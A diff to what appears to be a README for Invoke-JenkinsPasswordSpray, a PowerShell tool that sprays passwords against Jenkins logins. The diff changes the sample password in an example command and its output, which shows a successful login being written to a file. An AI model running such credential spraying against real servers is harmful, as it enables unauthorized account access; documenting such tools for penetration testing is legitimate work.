@@ -21,7 +21,7 @@ Invoke-JenkinsPasswordSpray -URL http://jenkins:8080 -UsernameFile .\users.txt -
 ### Example command with output
 
 ```PowerShell
-PS C:\Windows\temp> Invoke-JenkinsPasswordSpray -URL http://10.0.0.7:8080/login/notvalid -Username jenkinsadmin -Password rush2112 -ContinueOnSuccesss $true -Force -OutFile jenkins-sprayed.txt
+PS C:\Windows\temp> Invoke-JenkinsPasswordSpray -URL http://10.0.0.7:8080/login/notvalid -Username jenkinsadmin -Password admin -ContinueOnSuccesss $true -Force -OutFile jenkins-sprayed.txt
 
 [-] Detected trailing elements /login/notvalid in provided URL http://10.0.0.7:8080/login/notvalid.
 [-] Will now try to remove it for you.
@@ -34,8 +34,8 @@ Do you want to use the URL http://10.0.0.7:8080 instead?
 
 [+] Start password spraying the URL http://10.0.0.7:8080 with 1 user(s) and 1 password(s). Total request count is 1. Current time is 15:21
 [+] Writing successful logins to jenkins-sprayed.txt
-[Attempt 1 / 1] - Spraying username:jenkinsadmin with password:rush2112
-[+] SUCCESS! Username:jenkinsadmin Password:rush2112
+[Attempt 1 / 1] - Spraying username:jenkinsadmin with password:admin
+[+] SUCCESS! Username:jenkinsadmin Password:admin
 
 [+] Password spraying is complete
 [*] Any passwords that were successfully sprayed have been written to jenkins-sprayed.txt
